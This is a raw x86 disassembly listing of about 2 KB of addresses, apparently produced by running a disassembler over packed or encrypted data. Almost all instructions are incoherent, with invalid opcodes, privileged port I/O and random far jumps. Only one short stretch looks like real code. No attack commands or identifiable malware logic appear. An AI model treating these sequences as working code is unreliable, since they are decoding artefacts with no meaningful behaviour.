  4042b3:	xor    eax,0xc04a7bcd
  4042b8:	mov    esp,0xd679a456
  4042bd:	xchg   esp,eax
  4042be:	icebp  
  4042bf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c1:	push   ds
  4042c2:	jp     0x4042d1
  4042c4:	mov    dh,0x30
  4042c6:	add    esp,0xffffff8d
  4042c9:	rcr    cl,0x8
  4042cc:	push   edi
  4042cd:	mov    cl,0x6a
  4042cf:	push   edx
  4042d0:	aam    0x3c
  4042d2:	push   edi
  4042d3:	out    0x59,al
  4042d5:	hlt    
  4042d6:	push   ss
  4042d7:	jmp    0x18f2:0xe71769bb
  4042de:	lock in eax,dx
  4042e0:	rcl    BYTE PTR [edx+0x25a1b27],cl
  4042e6:	pop    ecx
  4042e7:	rcr    DWORD PTR [eax],cl
  4042e9:	cmp    edx,DWORD PTR [ebx-0x78]
  4042ec:	adc    ebx,DWORD PTR [esi-0x711edddb]
  4042f2:	in     al,0x2d
  4042f4:	push   ebp
  4042f5:	push   edx
  4042f6:	jg     0x4042b4
  4042f8:	ss sbb eax,0x28157057
  4042fe:	fist   WORD PTR [ebx+0x118e2af4]
  404304:	ficom  DWORD PTR [ebx+0xc87e978]
  40430a:	inc    edx
  40430b:	xchg   ebp,eax
  40430c:	dec    eax
  40430d:	adc    DWORD PTR [esi+esi*8],0xdeee96c7
  404314:	mov    al,0x9b
  404316:	jecxz  0x404397
  404318:	sbb    esi,DWORD PTR [esi]
  40431a:	mov    ds:0xdf18f393,al
  40431f:	lods   eax,DWORD PTR ds:[esi]
  404320:	das    
  404321:	xchg   ebx,eax
  404322:	inc    ebp
  404323:	cmp    bl,bl
  404325:	jecxz  0x404388
  404327:	push   ebx
  404328:	mov    WORD PTR [ecx+0x36],ds
  40432b:	push   ds
  40432c:	add    BYTE PTR [edx-0x6b44671f],cl
  404332:	add    ebp,edi
  404334:	daa    
  404335:	or     ebx,edx
  404337:	lahf   
  404338:	bound  edi,QWORD PTR [ebx+ebp*2]
  40433b:	mov    ah,BYTE PTR [ebx-0x7f2bd25e]
  404341:	stc    
  404342:	hlt    
  404343:	adc    BYTE PTR [eax+0x4c9bf8e2],0xd1
  40434a:	call   FWORD PTR [ebp+0x73]
  40434d:	jle    0x4043c1
  40434f:	or     DWORD PTR [edx+edx*1],esp
  404352:	adc    DWORD PTR [edx+0x3f],0x707563b2
  404359:	jns    0x404319
  40435b:	xor    BYTE PTR ds:0xf0b7262,ah
  404361:	clc    
  404362:	cmp    BYTE PTR [ecx-0x29b247d0],ah
  404368:	cmp    al,0x1e
  40436a:	(bad)  
  40436b:	jmp    FWORD PTR [edi-0x67]
  40436e:	ins    BYTE PTR es:[edi],dx
  40436f:	sub    BYTE PTR [esi+0x70db9a93],bh
  404375:	test   ebp,esp
  404377:	sti    
  404378:	popf   
  404379:	xor    BYTE PTR [esi],bl
  40437b:	sbb    DWORD PTR [esi-0x29],eax
  40437e:	cmp    eax,0x8beb7d7b
  404383:	inc    ebp
  404384:	in     eax,dx
  404385:	jmp    0x1ab9:0xd3ba9778
  40438c:	jg     0x4043df
  40438e:	test   al,0x9
  404390:	in     al,dx
  404391:	mov    bh,0x7
  404393:	std    
  404394:	lahf   
  404395:	xor    ebp,esp
  404397:	push   edx
  404398:	das    
  404399:	sub    al,0x5
  40439b:	out    dx,al
  40439c:	(bad)  
  40439d:	cld    
  40439e:	jmp    DWORD PTR [edx+0x52]
  4043a1:	jnp    0x4043a0
  4043a3:	test   BYTE PTR [edi],0x59
  4043a6:	add    ch,BYTE PTR [edi+0x54944f78]
  4043ac:	sbb    DWORD PTR [ebp+0x6a5848ef],esi
  4043b2:	call   0x6094a383
  4043b7:	xor    esi,DWORD PTR [edx+ebx*2-0x5d]
  4043bb:	jecxz  0x4043d1
  4043bd:	cwde   
  4043be:	cld    
  4043bf:	mov    dl,cl
  4043c1:	call   0xd5ea:0x7544c62f
  4043c8:	adc    eax,0x773cf1c9
  4043cd:	stos   BYTE PTR es:[edi],al
  4043ce:	xor    eax,ebx
  4043d0:	pop    edx
  4043d1:	data16 cmp al,dl
  4043d4:	les    eax,FWORD PTR [edi-0x79efedb]
  4043da:	lea    esi,[edi+0x6d41e4a2]
  4043e0:	ss mov dl,0x4e
  4043e3:	jg     0x4043ec
  4043e5:	push   cs
  4043e6:	loope  0x4043b7
  4043e8:	pusha  
  4043e9:	mov    edi,0xa151d583
  4043ee:	or     bh,dh
  4043f0:	lea    ebx,[ebx-0x3549d4ed]
  4043f6:	fadd   QWORD PTR [ecx+0x70a6bd00]
  4043fc:	jne    0x4043af
  4043fe:	sar    DWORD PTR [ebp-0x6af9fe9f],0x2d
  404405:	ja     0x4043ad
  404407:	push   ds
  404408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404409:	dec    edi
  40440a:	cmp    ecx,DWORD PTR [ecx-0x74c48faa]
  404410:	push   0xdf3fc4b7
  404415:	aas    
  404416:	outs   dx,BYTE PTR ds:[esi]
  404417:	jae    0x404436
  404419:	loope  0x40445d
  40441b:	inc    edx
  40441c:	and    DWORD PTR [edi-0x6b],0xcb5c40d
  404423:	stos   BYTE PTR es:[edi],al
  404424:	inc    esi
  404425:	mov    gs,WORD PTR [ecx+esi*8]
  404428:	loopne 0x4043b6
  40442a:	cmp    al,0x73
  40442c:	dec    dh
  40442e:	ins    DWORD PTR es:[edi],dx
  40442f:	jecxz  0x404435
  404431:	jnp    0x404430
  404433:	ins    DWORD PTR es:[edi],dx
  404434:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404436:	mov    cl,BYTE PTR [eax+eax*8]
  404439:	xchg   ecx,eax
  40443a:	push   esi
  40443b:	je     0x40445f
  40443d:	pop    edx
  40443e:	xchg   ecx,eax
  40443f:	repnz test eax,0xa695bfeb
  404445:	aam    0xb6
  404447:	xchg   ebp,eax
  404448:	popa   
  404449:	mov    edi,0x1864b9d5
  40444e:	push   edx
  40444f:	js     0x404413
  404451:	bound  edi,QWORD PTR [edx+0x45]
  404454:	aas    
  404455:	fcomp  QWORD PTR [edi-0x3c]
  404458:	(bad)  
  404459:	mov    esi,0x56e01678
  40445e:	aad    0xa
  404460:	addr16 xor al,0xef
  404463:	fs sub al,0xd9
  404466:	dec    ebp
  404467:	test   eax,0xc1c64551
  40446c:	fst    DWORD PTR [ebx-0x5fa79c3b]
  404472:	in     eax,0x11
  404474:	ror    BYTE PTR [ecx+esi*4],1
  404477:	jecxz  0x404420
  404479:	cs das 
  40447b:	or     dh,BYTE PTR [ebx]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404503
  404490:	sub    eax,0x185e5f96
  404495:	jle    0x404515
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x4044eb
  40449c:	dec    edx
  40449d:	(bad)  
  40449e:	push   ebx
  40449f:	xor    DWORD PTR [ebp+0x56c13fd7],ebp
  4044a5:	xchg   ecx,eax
  4044a6:	adc    ch,BYTE PTR [esi]
  4044a8:	push   ds
  4044a9:	mov    DWORD PTR [eax],0x879252ed
  4044af:	jb     0x40446d
  4044b1:	mov    ch,0x33
  4044b3:	jbe    0x404465
  4044b5:	popf   
  4044b6:	xchg   esp,eax
  4044b7:	adc    al,0x95
  4044b9:	xchg   edi,eax
  4044ba:	or     cl,BYTE PTR [ebx-0x49763e3a]
  4044c0:	push   ss
  4044c1:	pop    edi
  4044c2:	stc    
  4044c3:	push   eax
  4044c4:	sbb    bh,0x84
  4044c7:	repz xor esp,esi
  4044ca:	ffree  st(2)
  4044cc:	sbb    eax,0x532d18f8
  4044d1:	push   edx
  4044d2:	jle    0x4044e9
  4044d4:	sbb    eax,DWORD PTR [eax]
  4044d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d7:	xor    al,0x26
  4044d9:	inc    edi
  4044da:	addr16 inc edx
  4044dc:	std    
  4044dd:	into   
  4044de:	pop    esi
  4044df:	mov    edx,0x4595a997
  4044e4:	add    eax,0xcd1822e
  4044e9:	dec    edi
  4044ea:	pop    esi
  4044eb:	or     edx,ebp
  4044ed:	jbe    0x4044c9
  4044ef:	mov    ah,0xda
  4044f1:	ins    DWORD PTR es:[edi],dx
  4044f2:	mov    ch,0x98
  4044f4:	pop    ss
  4044f5:	mov    ebx,0x85ba43c0
  4044fa:	and    ebp,DWORD PTR [ebx+0x544758fb]
  404500:	push   esp
  404501:	(bad)  
  404502:	in     eax,0xa8
  404504:	push   ebp
  404505:	cld    
  404506:	(bad)  
  404508:	nop
  404509:	sar    DWORD PTR [ebp+0x3c7be5c8],cl
  40450f:	sbb    esi,eax
  404511:	xchg   BYTE PTR [ecx+ebp*8],bh
  404514:	jno    0x4044de
  404516:	sub    eax,0x312483f
  40451b:	pop    ebx
  40451c:	es out dx,eax
  40451e:	xor    ecx,DWORD PTR [edi+0x44]
  404521:	not    BYTE PTR [esi-0x37]
  404524:	fldcw  WORD PTR [ebx]
  404526:	sbb    edi,DWORD PTR [edx+0x464d3b82]
  40452c:	push   es
  40452d:	mov    dh,0x34
  40452f:	in     eax,dx
  404530:	xchg   esp,eax
  404531:	fnstenv [ebx+ebx*4+0x29]
  404535:	mov    al,ds:0x87d77115
  40453a:	lahf   
  40453b:	test   eax,0xaaf8ac94
  404540:	out    dx,eax
  404541:	dec    esi
  404542:	adc    edx,esp
  404544:	dec    ecx
  404545:	inc    eax
  404546:	adc    DWORD PTR [ecx],esp
  404548:	ficomp DWORD PTR [ecx-0x50]
  40454b:	fcomp  DWORD PTR [ebx+0x797d14f6]
  404551:	jbe    0x40451c
  404553:	lods   al,BYTE PTR ds:[esi]
  404554:	rcr    BYTE PTR [edi],1
  404556:	dec    eax
  404557:	lods   al,BYTE PTR ds:[esi]
  404558:	repz stc 
  40455a:	les    ebx,FWORD PTR [edi]
  40455c:	or     DWORD PTR [esi],edi
  40455e:	test   al,0xc3
  404560:	adc    bh,dl
  404562:	jns    0x404555
  404564:	nop
  404565:	mov    esp,0xbfea3ec1
  40456a:	js     0x40451d
  40456c:	pop    esi
  40456d:	jmp    0x40458c
  40456f:	cld    
  404570:	ret    0x74f8
  404573:	enter  0x24f2,0x21
  404577:	mov    bh,0x66
  404579:	jmp    0x6b7:0xbce3bc02
  404580:	mov    ebp,0xf34ca403
  404585:	jae    0x40450e
  404587:	sbb    BYTE PTR [edi-0x3b473bd7],0x1e
  40458e:	mov    ds:0x3f61bfb6,eax
  404593:	pusha  
  404594:	scas   eax,DWORD PTR es:[edi]
  404595:	daa    
  404596:	add    ecx,eax
  404598:	xor    al,BYTE PTR [esi]
  40459a:	leave  
  40459b:	idiv   BYTE PTR [eax]
  40459d:	sbb    eax,0x39ada284
  4045a2:	fisttp WORD PTR [edi+0x92eb604]
  4045a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a9:	ins    DWORD PTR es:[edi],dx
  4045aa:	repnz sub al,0xe0
  4045ad:	(bad)  
  4045ae:	pop    esp
  4045af:	adc    ax,0xbd39
  4045b3:	lods   al,BYTE PTR ds:[esi]
  4045b4:	rcl    DWORD PTR [edx],cl
  4045b6:	dec    eax
  4045b7:	mov    ds:0x5f9c8eb3,al
  4045bd:	lahf   
  4045be:	imul   edx,DWORD PTR [edx+ecx*4+0x41f3e666],0x50f510dc
  4045c9:	dec    eax
  4045ca:	cmp    ch,BYTE PTR [edi+0x285c556a]
  4045d0:	icebp  
  4045d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045d2:	jno    0x404628
  4045d4:	test   al,0x79
  4045d6:	mov    ecx,0xbbedf10d
  4045db:	ror    BYTE PTR [eax],1
  4045dd:	retf   0xa3f9
  4045e0:	jns    0x404628
  4045e2:	ficomp DWORD PTR [edx]
  4045e4:	daa    
  4045e5:	pop    edx
  4045e6:	sub    ah,BYTE PTR [ebp+0x642ba3a1]
  4045ec:	xlat   BYTE PTR ds:[ebx]
  4045ed:	fcmove st,st(4)
  4045ef:	loop   0x404594
  4045f1:	das    
  4045f2:	into   
  4045f3:	xchg   esi,eax
  4045f4:	mov    edx,0xa2fb80ce
  4045f9:	mov    esi,ebp
  4045fb:	adc    al,0xfb
  4045fd:	mov    edi,0x80698f3a
  404602:	mov    ch,0x41
  404604:	jb     0x404677
  404606:	xor    BYTE PTR [ebx+edx*8+0x512db8ca],al
  40460d:	or     eax,0x20af83cd
  404612:	push   0x298c1671
  404617:	fs test al,0x2f
  40461a:	or     edi,DWORD PTR [ebx+0x74]
  40461d:	mov    ah,0xc5
  40461f:	dec    edi
  404620:	sbb    al,0xc0
  404622:	aas    
  404623:	add    al,0x6e
  404625:	jmp    0x2caeccc4
  40462a:	mov    ecx,0x5362430d
  40462f:	hlt    
  404630:	mov    cl,0xc5
  404632:	out    0xce,eax
  404634:	fwait
  404635:	xchg   esi,eax
  404636:	mov    ch,BYTE PTR [eax+0x6254b238]
  40463c:	mov    al,ds:0x80a1d60f
  404641:	stc    
  404642:	dec    ecx
  404643:	mov    bl,0xfe
  404645:	outs   dx,DWORD PTR ds:[esi]
  404646:	sbb    dh,ah
  404648:	shl    DWORD PTR [edx-0x4e],0x8f
  40464c:	pop    edx
  40464d:	repnz sbb BYTE PTR ss:[edx+0x13bcdbec],bh
  404655:	jnp    0x4045e6
  404657:	jo     0x4046a8
  404659:	imul   esi,DWORD PTR ds:[edi+0x57],0x5358c0db
  404661:	fisubr WORD PTR ds:0xe560eb64
  404667:	and    esp,DWORD PTR [ebp+0x54]
  40466a:	aas    
  40466b:	aad    0x1b
  40466d:	nop
  40466e:	call   0x1338d7eb
  404673:	pop    esi
  404674:	fnstsw WORD PTR [edx]
  404676:	test   al,0x5c
  404678:	xor    al,0xd8
  40467a:	sub    eax,0x50940037
  40467f:	(bad)  
  404680:	aam    0xda
  404682:	and    eax,0x692565eb
  404687:	loopne 0x404686
  404689:	in     al,dx
  40468a:	sub    cl,dl
  40468c:	inc    eax
  40468d:	mov    es,WORD PTR [ecx]
  40468f:	inc    esi
  404690:	push   0x43
  404692:	xchg   edx,eax
  404693:	adc    al,0xd0
  404695:	xlat   BYTE PTR ds:[ebx]
  404696:	or     al,0x8
  404698:	jnp    0x4046b9
  40469a:	cmp    ebx,DWORD PTR cs:0xb4724f79
  4046a1:	add    DWORD PTR [edi+0x30],ecx
  4046a4:	mov    ch,0xb2
  4046a6:	fs mov dl,0xe
  4046a9:	popa   
  4046aa:	inc    ebp
  4046ab:	pop    ds
  4046ac:	adc    ch,ah
  4046ae:	push   ebp
  4046af:	or     ch,BYTE PTR es:[esi-0x40]
  4046b3:	inc    esp
  4046b4:	sub    DWORD PTR [edi],esi
  4046b6:	popa   
  4046b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b8:	mov    cl,0xc0
  4046ba:	mov    ebx,0xf5021bb
  4046bf:	pop    esp
  4046c0:	adc    esi,DWORD PTR [esi-0x41]
  4046c3:	icebp  
  4046c4:	iret   
  4046c5:	mov    dl,0x34
  4046c7:	jp     0x4046a1
  4046c9:	jmp    0x40464e
  4046cb:	pop    esi
  4046cc:	aaa    
  4046cd:	repz mov ebx,0x1d0394d6
  4046d3:	inc    eax
  4046d4:	rol    BYTE PTR [ebx+eiz*1+0x49d0e520],0x74
  4046dc:	not    DWORD PTR [edx-0x6aa6d38c]
  4046e2:	out    dx,al
  4046e3:	or     al,0x97
  4046e5:	mov    ebp,0x185d21e2
  4046ea:	pop    ebx
  4046eb:	pop    edx
  4046ec:	jle    0x404721
  4046ee:	sbb    dl,dl
  4046f0:	inc    edx
  4046f1:	mov    DWORD PTR [ebx],esp
  4046f3:	mov    edx,0xdc3cc183
  4046f8:	in     al,0x3b
  4046fa:	xor    DWORD PTR [ecx+0x443ace0b],edx
  404700:	jbe    0x4046ed
  404702:	(bad)  
  404703:	int    0x8
  404705:	out    dx,eax
  404706:	mov    ecx,0x5f462376
  40470b:	addr16 inc esi
  40470d:	cmc    
  40470e:	out    0xad,eax
  404710:	mov    edx,DWORD PTR [ecx-0x51001c11]
  404716:	fldenv [ebx+ebp*2-0x36]
  40471a:	fwait
  40471b:	(bad)
  40471e:	xchg   edi,eax
  40471f:	fimul  DWORD PTR [ebx-0x5e6fc0e]
  404725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404726:	add    al,bl
  404728:	pop    eax
  404729:	jmp    edi
  40472b:	pusha  
  40472c:	jg     0x404763
  40472e:	dec    edx
  40472f:	lods   al,BYTE PTR ds:[esi]
  404730:	jbe    0x404742
  404732:	jle    0x40471b
  404734:	xor    eax,0xc2a1a954
  404739:	xor    eax,0xe793b758
  40473e:	lahf   
  40473f:	jb     0x40477d
  404741:	sahf   
  404742:	sar    BYTE PTR [ecx-0x555f8e81],0xd8
  404749:	mov    al,0xcb
  40474b:	das    
  40474c:	pop    es
  40474d:	gs jo  0x4046f3
  404750:	call   0xa3f3:0x7b76659e
  404757:	mov    cl,0x10
  404759:	rol    DWORD PTR [ecx-0x2b],0xba
  40475d:	inc    ecx
  40475e:	inc    esi
  40475f:	int    0x9f
  404761:	jb     0x404781
  404763:	jne    0x40473f
  404765:	stc    
  404766:	fild   DWORD PTR [ecx+0x54]
  404769:	test   al,0x2a
  40476b:	in     eax,dx
  40476c:	push   esi
  40476d:	loope  0x404768
  40476f:	pop    ecx
  404770:	addr16 jl 0x404782
  404773:	daa    
  404774:	inc    ebx
  404775:	mov    BYTE PTR [esi+eax*2+0x2],dl
  404779:	lock inc edx
  40477b:	neg    esp
  40477d:	adc    BYTE PTR [edx-0x2fcc4074],dh
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	inc    esi
  4047b5:	rcl    al,0x2f
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404742
  4047c1:	sar    BYTE PTR [ebx],0x4b
  4047c4:	fdivr  st,st(3)
  4047c6:	mov    BYTE PTR [esi+0x45994a14],0xe5
  4047cd:	mov    eax,ds:0xc0e59aff
  4047d2:	cwde   
  4047d3:	fidiv  DWORD PTR [eax]
  4047d5:	outs   dx,BYTE PTR ds:[esi]
  4047d6:	pop    edi
  4047d7:	lods   al,BYTE PTR ds:[esi]
  4047d8:	mov    eax,0xa9b45935
  4047dd:	and    BYTE PTR [edi-0x3a],al
  4047e0:	or     cl,BYTE PTR [esi]
  4047e2:	nop
  4047e3:	cwde   
  4047e4:	rcr    DWORD PTR [edi+0x196357af],1
  4047ea:	shl    ebx,cl
  4047ec:	(bad)  
  4047ed:	lahf   
  4047ee:	ret    0x9c01
  4047f1:	jbe    0x404779
  4047f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047f4:	sbb    al,0xfe
  4047f6:	retf   
  4047f7:	mov    BYTE PTR [edi-0xefc1f48],dh
  4047fd:	push   edx
  4047fe:	and    esi,edx
  404800:	out    dx,eax
  404801:	adc    DWORD PTR [ebx-0x553b90d7],ebx
  404807:	xchg   ebx,eax
  404808:	mov    ds:0xa98bdd9c,eax
  40480d:	iret   
  40480e:	sahf   
  40480f:	and    BYTE PTR [ebp-0x40],cl
  404812:	mov    ebx,0x2acef13c
  404817:	add    al,0x35
  404819:	mov    edi,0xed655155
  40481e:	push   edi
  40481f:	and    dl,BYTE PTR [edi+0x518883b6]
  404825:	or     ebx,DWORD PTR [ebx]
  404827:	inc    ebx
  404829:	push   esi
  40482a:	sbb    DWORD PTR [eax+0x16],edx
  40482d:	sub    cl,BYTE PTR [ebx-0x4e]
  404830:	add    al,0x5c
  404832:	popaw  
  404834:	jmp    0xfb213b30
  404839:	xor    al,0x1b
  40483b:	jnp    0x40486d
  40483d:	ss sbb al,0xbf
  404840:	cmp    al,0x6
  404842:	jg     0x4047e7
  404844:	fisub  WORD PTR [edi+0x1e64d6dc]
  40484a:	clc    
  40484b:	shl    DWORD PTR [ebx],0xfa
  40484e:	dec    eax
  40484f:	ins    DWORD PTR es:[edi],dx
  404850:	or     DWORD PTR [esi+0x7],edi
  404853:	mov    dl,0xd6
  404855:	loopne 0x404870
  404857:	push   edx
  404858:	(bad)  
  404859:	test   al,0x5
  40485b:	pushf  
  40485c:	fadd   DWORD PTR [edx+0x1660730a]
  404862:	sbb    eax,0x1926a7c0
  404867:	nop
  404868:	cmp    bl,dh
  40486a:	loop   0x404809
  40486c:	out    dx,eax
  40486d:	test   BYTE PTR [ebx-0x2fa9440c],al
  404873:	repnz mov eax,0xfb77132b
  404879:	push   ebp
  40487a:	mov    bl,0xc0
  40487c:	mov    BYTE PTR [esi+ecx*4+0x20],cl
  404880:	fnstcw WORD PTR [esi+0x23babdf4]
  404886:	xor    esi,ebp
  404888:	out    0x85,al
  40488a:	jae    0x404873
  40488c:	inc    esi
  40488d:	mov    ch,0x9
  40488f:	xchg   esp,edx
  404891:	popa   
  404892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404893:	inc    ecx
  404894:	nop
  404895:	sar    BYTE PTR [esp+ebp*2+0x6d],1
  404899:	xor    al,0x9f
  40489b:	dec    ecx
  40489c:	stc    
  40489d:	and    eax,0x1eab4f9
  4048a2:	dec    ebp
  4048a3:	push   edi
  4048a4:	jmp    0x198d:0xe14efce8
  4048ab:	ins    BYTE PTR es:[edi],dx
  4048ac:	cmp    BYTE PTR [ebx-0x1395350a],bh
  4048b2:	and    ah,dl
  4048b4:	lea    ebp,[edi]
  4048b6:	mov    bl,0xba
  4048b8:	xchg   edi,eax
  4048b9:	cli    
  4048ba:	cwde   
  4048bb:	adc    DWORD PTR [edi-0x55],esi
  4048be:	js     0x404858
  4048c0:	cmp    ebx,DWORD PTR [ecx-0x79]
  4048c3:	je     0x40489d
  4048c5:	das    
  4048c6:	call   0xc88db112
  4048cb:	mov    dl,0x6a
  4048cd:	xlat   BYTE PTR ds:[ebx]
  4048ce:	add    eax,0x11d252ae
  4048d3:	iret   
  4048d4:	int3   
  4048d5:	cld    
  4048d6:	out    dx,al
  4048d7:	js     0x40493b
  4048d9:	sbb    dl,BYTE PTR [ecx+0x15f2d53]
  4048df:	je     0x4048c6
  4048e1:	mov    bl,0x61
  4048e3:	push   ds
  4048e4:	mov    dl,0x28
  4048e6:	daa    
  4048e7:	mov    dl,0x2d
  4048e9:	fcmovne st,st(5)
  4048eb:	pop    ecx
  4048ec:	rcr    dh,1
  4048ee:	push   ebp
  4048ef:	fs out 0xfe,eax
  4048f2:	out    0xed,al
  4048f4:	int    0x80
  4048f6:	es cmp al,0xd9
  4048f9:	pop    ecx
  4048fa:	mov    eax,DWORD PTR [edx-0x65]
  4048fd:	das    
  4048fe:	push   esp
  4048ff:	sti    
  404900:	adc    DWORD PTR [esi],ebp
  404902:	adc    ch,BYTE PTR [eax-0x3365c488]
  404908:	jne    0x4048c6
  40490a:	sbb    eax,0x1607a329
  40490f:	mov    edx,0xc0bf6192
  404914:	clc    
  404915:	or     al,0xa1
  404917:	repnz outs dx,DWORD PTR gs:[esi]
  40491a:	loope  0x4048a8
  40491c:	aaa    
  40491d:	mov    esi,0xa2238524
  404922:	xchg   ebp,eax
  404923:	xor    dh,BYTE PTR [ebx]
  404925:	js     0x4049a4
  404927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404928:	dec    esp
  404929:	adc    eax,0x8eb0a3df
  40492e:	push   eax
  40492f:	cmovbe esp,eax
  404932:	and    esi,ebp
  404934:	loope  0x4048c4
  404936:	ins    DWORD PTR es:[edi],dx
  404937:	mov    ecx,0x14c81fa5
  40493c:	cli    
  40493d:	outs   dx,BYTE PTR ds:[esi]
  40493e:	jge    0x404953
  404940:	fsubr  st(3),st
  404942:	push   es
  404943:	and    DWORD PTR [esi+0x7c],eax
  404946:	leave  
  404947:	or     esp,0x53
  40494a:	ficomp DWORD PTR cs:[edx-0x70c0cea3]
  404951:	sti    
  404952:	mov    edx,0x4e29c0d9
  404957:	fisubr WORD PTR [ecx]
  404959:	xchg   esp,eax
  40495a:	mov    ah,0xf5
  40495c:	or     al,0x23
  40495e:	xlat   BYTE PTR ds:[ebx]
  40495f:	(bad)  
  404960:	mov    eax,0x910c7e0d
  404965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404966:	push   ds
  404967:	xchg   ecx,eax
  404968:	and    BYTE PTR [edx+0x3e],bh
  40496b:	xchg   esi,eax
  40496c:	fcmovnb st,st(2)
  40496e:	sbb    ch,bh
  404970:	call   0x2f39d9db
  404975:	inc    BYTE PTR [ebp-0x43]
  404978:	test   al,0xda
  40497a:	sbb    esp,edx
  40497c:	xchg   esi,eax
  40497d:	or     DWORD PTR [edx-0x2b],esp
  404980:	or     BYTE PTR [edi],cl
  404982:	or     eax,0x30f48fa4
  404987:	jg     0x404909
  404989:	inc    esi
  40498a:	stos   BYTE PTR es:[edi],al
  40498b:	call   0xdea2:0x65a05fb2
  404992:	jb     0x404918
  404994:	mov    BYTE PTR [ebx+0x15],bh
  404997:	xchg   bh,al
  404999:	inc    ebx
  40499b:	mov    ebp,DWORD PTR [ecx]
  40499d:	mov    BYTE PTR [ebx],ch
  40499f:	xchg   ebx,eax
  4049a0:	push   edx
  4049a1:	loop   0x40495b
  4049a3:	or     edi,eax
  4049a5:	sub    BYTE PTR [ebx-0x14],dl
  4049a8:	std    
  4049a9:	fstsw  WORD PTR [edx+0x9257f66]
  4049b0:	dec    sp
  4049b2:	mov    ds:0xb09e8984,al
  4049b7:	and    cl,BYTE PTR ds:0xe34622c2
  4049bd:	push   edx
  4049be:	cli    
  4049bf:	rcl    edi,0x13
  4049c2:	mov    esp,0x369cc75
  4049c7:	ins    DWORD PTR es:[edi],dx
  4049c8:	xor    DWORD PTR [esi-0x130ad7b3],esp
  4049ce:	inc    esp
  4049cf:	aad    0x0
  4049d1:	pop    esi
  4049d2:	mov    ch,0xc5
  4049d4:	shr    DWORD PTR [eax],0xc7
  4049d7:	add    al,0xe9
  4049d9:	mov    ds:0x61ffca93,eax
  4049de:	fwait
  4049df:	in     eax,dx
  4049e0:	fdivr  QWORD PTR [edi+0x55e2f324]
  4049e6:	cmovge ebx,DWORD PTR [esi+0x1ef13b7a]
  4049ed:	cmc    
  4049ee:	adc    DWORD PTR [eax],0xfffffff0
  4049f1:	int3   
  4049f2:	mov    cs,WORD PTR [bx+di]
  4049f5:	dec    ebp
  4049f6:	les    edx,FWORD PTR [eax]
  4049f8:	push   edx
  4049f9:	xchg   ebx,eax
  4049fa:	sbb    ch,dl
  4049fc:	enter  0x86cf,0x77
  404a00:	fwait
  404a01:	inc    esi
  404a02:	fild   QWORD PTR [edi+0x261f9bdb]
  404a08:	ret    
  404a09:	test   al,0x98
  404a0b:	stos   BYTE PTR es:[edi],al
  404a0c:	fimul  DWORD PTR [esi]
  404a0e:	fdivr  DWORD PTR [ecx-0x71]
  404a11:	jl     0x404a83
  404a13:	enter  0x64b2,0x48
  404a17:	sbb    eax,0x58fd26b8
  404a1c:	mov    eax,ecx
  404a1e:	leave  
  404a1f:	mov    edi,0x574a4b14
  404a24:	sti    
  404a25:	and    eax,DWORD PTR [edx-0x3fc65188]
  404a2b:	dec    edi
  404a2c:	jb     0x404a82
  404a2e:	and    BYTE PTR [edx-0x2dd90b1e],cl
  404a34:	outs   dx,BYTE PTR ds:[esi]
  404a35:	not    BYTE PTR [esi-0x53]
  404a38:	pop    ds
  404a39:	dec    edi
  404a3a:	lods   eax,DWORD PTR ds:[esi]
  404a3b:	or     eax,0x458d0b99
  404a40:	sbb    cl,BYTE PTR [ebx+0x1f2b9e53]
  404a46:	pop    ebp
  404a47:	inc    eax
  404a48:	pop    edx
  404a49:	adc    DWORD PTR [ecx+0x3],edx
  404a4c:	imul   eax,DWORD PTR [esi],0x300e295
  404a52:	clc    
  404a53:	jns    0x404a3b
  404a55:	(bad)  
  404a56:	mov    ch,cl
  404a58:	data16 ins BYTE PTR es:[edi],dx
  404a5a:	and    al,0x69
  404a5c:	xor    cl,BYTE PTR [esi]
  404a5e:	mov    eax,DWORD PTR [ecx+0x78acbd34]
  404a64:	(bad)
  404a67:	xor    BYTE PTR [edi],0xcd
  404a6a:	fsub   st,st(7)
  404a6c:	or     BYTE PTR [edi-0x76],0x1d
  404a70:	xchg   esi,eax
  404a71:	rol    edi,1
  404a73:	xchg   edx,eax
  404a74:	cmp    al,0xbc
  404a76:	sbb    cl,BYTE PTR [ebx+0x79]
  404a79:	test   BYTE PTR [edi+0x1d],dl
  404a7c:	dec    ebx
  404a7d:	into   
  404a7e:	and    ah,BYTE PTR [ecx]
  404a80:	imul   esi,DWORD PTR [eax],0xffffff8f
  404a83:	cmc    
  404a84:	dec    esi
  404a85:	gs clc 
  404a87:	rol    DWORD PTR fs:[ecx-0x543deeda],cl
  404a8e:	lods   al,BYTE PTR ds:[esi]
  404a8f:	test   DWORD PTR [edi+0x56],eax
  404a92:	cmp    eax,0x698f8066
  404a97:	sbb    cl,dh
  404a99:	sbb    BYTE PTR [eax],dl
  404a9b:	add    esp,DWORD PTR fs:[ecx]
